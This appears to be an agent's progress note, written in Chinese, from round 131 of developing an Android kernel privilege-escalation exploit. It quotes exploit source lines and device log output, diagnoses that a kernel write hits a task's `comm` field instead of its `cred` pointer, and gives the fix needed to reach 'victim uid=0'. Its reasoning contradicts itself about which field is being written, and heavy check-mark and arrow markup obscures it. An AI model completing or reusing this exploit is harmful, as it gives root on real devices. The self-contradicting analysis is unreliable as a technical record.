# 43499 · 第 131 轮：**根因完整 —— 目标偏移取的是 `comm`，不是 `cred`** ✓✓✓

## 一、本树的算式（✓✓✓，逐行 ✓）

```cpp
// main.cpp:654
const std::uint64_t victim_target = spawned.task + **victim_comm_off**;   // ★ 偏移 = **comm** ✗
// main.cpp:991
route_values.target = victim_target;                                     // 主 route 的目标 ✓
// main.cpp:838（修复轮）
repair_request.target = kAliasBase + init_cred_image + alias_image_delta + 8U;   // = `init_cred + 8` ✗
```

## 二、真机对照（✓✓✓）

```
`main: step=w2 target=0xffffff894259cf98` ✓ —— 主 route 确实在写 `task + **comm** 偏移`（⇒ 0x…cf98 ✓）；
`main: repair-round step=w1 target=0xffff800000118108` ✓ / `firing … target=0xffffff802abfd590` ✗（修复轮 ✗）；
归档 `steps.cpp:165`：`"W2: cred", **child_task + task_cred_off()**` ✓ ⇒ **主与修复用同一个目标（cred ✓）**；
⇒ ⇒ ⇒ **⇒ 二者的"写"都指向 victim 的 cred 字段** ✓ ⇒ ⇒ **⇒ 这才是"改身份"的那一处** ✓✓。
```

## 三、为什么此前所有机制读数都对（✓✓✓）

```
因为路由/页/编码/值**确实**都正确 ✓ —— 只是**写落在了 `comm`（任务名）而不是 `cred`** ✗：
⇒ ⇒ **⇒ 写"发生了"，但改的是无害字段** ✓ ⇒ ⇒ **⇒ `uid` 自然不变** ✓ ⇒ 与全部历史读数**完全一致** ✓✓；
⇒ 且这解释了为何 `stamp=-1/99`、`successes=1`、`clean=1/1` 全绿 ✗（⇒ 那些都只说明"拷贝到达"✓，与"改谁"无关 ✓）。
```

## 四、改法（✓，两处、各一行 ✓）

```
① `main.cpp:654`：把 `victim_comm_off` 换成 **cred 偏移** ✓（⇒ abi 权威：`abi.task_struct.cred = 0x798` ✓，第 40 轮已核 ✓）；
   ⇒ 即 `victim_target = spawned.task + <cred_off>` ✓ ⇒ 主 route 写 **victim 的 cred 指针** ✓；
② `main.cpp:838`：把修复轮的目标改为**同一个算式** ✓（⇒ 与退役"主与修复同目标"一致 ✓），
   ⇒ 不再用 `init_cred + 8` ✗；
③ 判据：`main: victim uid=0` ✓（⇒ 以及 `child uid = 0` 同形读数 ✓）。
```

## 五、门禁（✓，本轮未改码 ✓）

```
check → 109 PASS ✓；android → 0 error / 0 warning ✓；lint → 0 ✓
```
